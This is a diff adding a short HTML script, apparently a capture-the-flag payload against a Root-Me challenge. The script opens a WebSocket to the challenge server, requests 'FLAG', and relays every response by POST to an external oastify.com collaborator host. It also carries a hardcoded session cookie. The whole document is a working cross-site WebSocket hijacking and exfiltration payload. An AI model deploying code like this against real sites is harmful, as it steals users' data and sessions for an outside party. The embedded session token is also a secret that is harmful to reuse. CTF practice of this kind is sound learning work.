@@ -1,0 +1,16 @@
+<script>
+  var ws = new WebSocket('ws://ctf07.root-me.org/ws');
+  ws.onopen = function() {
+      ws.send("FLAG");
+  };
+  ws.onmessage = function(event) {
+      fetch('https://l5rnbmnda36b6okuo7b20iqlzc53tvhk.oastify.com', {
+          method: 'POST', 
+          mode: 'no-cors', 
+          body: event.data,
+          headers: {
+              'Cookie': '_ga=GA1.1.750095164.1742182078; _ga_SRYSKX09J7=GS1.1.1742182078.1.0.1742182079.0.0.0; connect.sid=s%3AU-oDJcfBUqCIHHdF9ozitFhxJ-w3DJYj.VNfrWhasyF2OwzX4p64OB4tlvyLjbfByXu6CtSinXR0',
+          }
+      });
+  };
+</script>
